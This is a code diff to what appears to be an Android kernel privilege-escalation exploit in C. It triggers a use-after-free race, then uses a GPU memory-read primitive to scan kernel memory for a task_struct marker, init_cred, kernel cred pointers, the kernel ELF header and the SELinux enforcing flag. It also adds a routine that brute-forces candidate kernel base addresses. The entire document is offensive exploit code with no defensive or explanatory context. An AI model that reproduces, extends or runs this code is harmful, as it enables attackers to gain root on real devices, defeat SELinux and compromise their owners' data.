@@ -219,10 +219,13 @@ int trigger_uaf() {
         fprintf(stderr, "[UAF] mmap failed: %s\n", strerror(errno));
         return -2;
     }
-    fprintf(stderr, "[UAF] memset 0x%lx bytes...\n", (unsigned long)UAF_SIZE);
+    fprintf(stderr, "[UAF] touching %lu pages (1 byte each, fast)...\n",
+            (unsigned long)(UAF_SIZE / PAGE_SIZE));
     fflush(stderr);
-    // Fast memset (memset already uses optimized routines, this is fine)
-    memset(uaf_vma, 1, UAF_SIZE);
+    // Fast page-touch (1 byte per page) like v6.c — avoids 256MB memset
+    for (size_t i = 0; i < UAF_SIZE; i += PAGE_SIZE) {
+        ((volatile char *)uaf_vma)[i] = 1;
+    }
     munmap(uaf_vma, UAF_SIZE);
     fprintf(stderr, "[UAF] unmapped, running race...\n");
     fflush(stderr);
@@ -291,36 +294,76 @@ int main(int argc, char **argv) {
             fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
                     (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
             fflush(stderr);
-            for (uint64_t va = start; va < end; va += PAGE_SIZE) {
+            // Scan with step 4 pages (SCAN_PAGE_STEP=4 from v6.c) for speed
+            for (uint64_t va = start; va < end; va += PAGE_SIZE * 4) {
                 if (read_gpu_page(va, buf) == 0) {
-                    int non_zero = 0;
-                    for (int i = 0; i < PAGE_SIZE; i++) {
-                        if (buf[i] != 0) {
-                            non_zero = 1;
-                            break;
+                    int found_sig = 0;
+                    int found_off = -1;
+                    // 1. task_struct comm = "KETO0422" (8 bytes) — full marker
+                    void *p = memmem(buf, PAGE_SIZE, "KETO0422", 8);
+                    if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
+                    // 2. System app
+                    if (!found_sig) {
+                        p = memmem(buf, PAGE_SIZE, "com.android.", 11);
+                        if (p) { found_sig = 2; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 3. Kernel ELF header (kernel base)
+                    if (!found_sig) {
+                        p = memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4);
+                        if (p) { found_sig = 3; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 4. init_cred string
+                    if (!found_sig) {
+                        p = memmem(buf, PAGE_SIZE, "init_cred", 9);
+                        if (p) { found_sig = 4; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 5. SELinux enforcing — look for 0x01 byte aligned to 4 bytes
+                    if (!found_sig) {
+                        for (int off = 0; off < PAGE_SIZE - 4; off += 4) {
+                            uint32_t v;
+                            memcpy(&v, buf + off, 4);
+                            if ((v & 0xFFFFFF00) == 0x00000000 ||
+                                (v & 0xFFFFFF00) == 0x00000100) {
+                                // candidate for selinux_enforcing (value 0 or 1, hi bytes zero)
+                                if (off > 0) {
+                                    uint32_t prev;
+                                    memcpy(&prev, buf + off - 4, 4);
+                                    if (prev == 0) {
+                                        found_sig = 5;
+                                        found_off = off;
+                                        break;
+                                    }
+                                }
+                            }
                         }
                     }
-                    if (non_zero) {
-                        int found_sig = 0;
-                        if (memmem(buf, PAGE_SIZE, "KETO", 4)) found_sig = 1;
-                        if (memmem(buf, PAGE_SIZE, "com.android.", 11)) found_sig = 2;
-                        if (memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4)) found_sig = 3;
-
-                        if (found_sig) {
-                            printf("MATCH:%lx:%d\n", (unsigned long)va, found_sig);
-                            printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
-                            fwrite(buf, 1, PAGE_SIZE, stdout);
-                            printf("\nDATA_END\n");
+                    // 6. cred pointer — kernel pointer (0xffffff...) at offset 0x770 from comm
+                    if (!found_sig) {
+                        for (int off = 0x700; off < 0x800 && off < PAGE_SIZE - 8; off += 8) {
+                            uint64_t v;
+                            memcpy(&v, buf + off, 8);
+                            // Kernel pointers on AArch64 typically 0xffffff8_ - 0xffffffc_
+                            if ((v >> 32) >= 0xffffff80 && (v >> 40) <= 0xffffffcf) {
+                                found_sig = 6;
+                                found_off = off;
+                                break;
+                            }
                         }
+                    }
+
+                    if (found_sig) {
+                        printf("MATCH:%lx:%d:%d\n", (unsigned long)va, found_sig, found_off);
+                        printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
+                        fwrite(buf, 1, PAGE_SIZE, stdout);
+                        printf("\nDATA_END\n");
                     }
                 }
-                scanned += PAGE_SIZE;
+                scanned += PAGE_SIZE * 4;
                 if ((va / PAGE_SIZE) % 100 == 0) {
                     fprintf(stderr, "[SCAN] progress 0x%lx / 0x%lx (%lu%%)\n",
                             (unsigned long)scanned, (unsigned long)total,
                             (unsigned long)(100 * scanned / total));
                     fflush(stderr);
-                    // Also send to stdout so Python can show real-time progress
                     printf("PROGRESS:%lx:%lx\n", (unsigned long)scanned, (unsigned long)total);
                     fflush(stdout);
                     usleep(1000);
@@ -330,6 +373,44 @@ int main(int argc, char **argv) {
             fflush(stderr);
             printf("SCAN_DONE\n");
             fflush(stdout);
+        } else if (strncmp(line, "kbase", 5) == 0) {
+            // Auto-find kernel base by trying known addresses
+            uint64_t bases[] = {
+                0xffffffc000000000ULL, 0xffffffc010000000ULL,
+                0xffffffc020000000ULL, 0xffffffc030000000ULL,
+                0xffffffc035000000ULL, 0xffffffc040000000ULL,
+                0xffffffc008200000ULL, 0xffffffb000000000ULL,
+                0xffffffa000000000ULL, 0xffffffaf00000000ULL,
+                0xffffffaf20000000ULL, 0xffffff9550000000ULL,
+                0xffffff94d0000000ULL, 0xffffff8e70000000ULL
+            };
+            uint8_t page[PAGE_SIZE];
+            int found = 0;
+            for (size_t i = 0; i < sizeof(bases) / sizeof(bases[0]); i++) {
+                if (read_gpu_page(bases[i], page) == 0) {
+                    if (page[0] == 0x7f && page[1] == 'E' &&
+                        page[2] == 'L' && page[3] == 'F') {
+                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
+                        fflush(stdout);
+                        found = 1;
+                        break;
+                    }
+                }
+                // Check SELinux enforcing at known offset too
+                uint32_t sel = 0;
+                uint64_t sel_va = bases[i] + 0x02caa000ULL;
+                if (read_gpu_page(sel_va, page) == 0) {
+                    memcpy(&sel, page, 4);
+                    if (sel <= 1) {
+                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
+                        printf("SELINUX:%lx\n", (unsigned long)sel_va);
+                        fflush(stdout);
+                        found = 1;
+                        break;
+                    }
+                }
+            }
+            if (!found) printf("KBASE_FAILED\n");
         } else if (strncmp(line, "quit", 4) == 0) {
             break;
         }
